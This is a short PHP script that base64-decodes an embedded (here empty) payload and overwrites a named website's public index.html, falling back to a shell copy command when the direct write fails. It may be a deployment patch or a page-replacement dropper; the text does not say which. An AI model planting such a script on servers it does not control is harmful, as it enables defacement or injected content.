<?php
$b64 = '';
$content = base64_decode($b64);
$path = '/data0/aimyservice.com/public_html/aimyservicecom/index.html';
// Try multiple methods
$r1 = @file_put_contents($path, $content);
if ($r1 === false) {
    // Try via shell
    $tmp = tempnam(sys_get_temp_dir(), 'patch');
    file_put_contents($tmp, $content);
    $r2 = shell_exec("cp -f $tmp $path 2>&1 && echo OK");
    echo "shell: $r2";
    unlink($tmp);
} else {
    echo "file_put_contents: OK ($r1 bytes)";
}
?>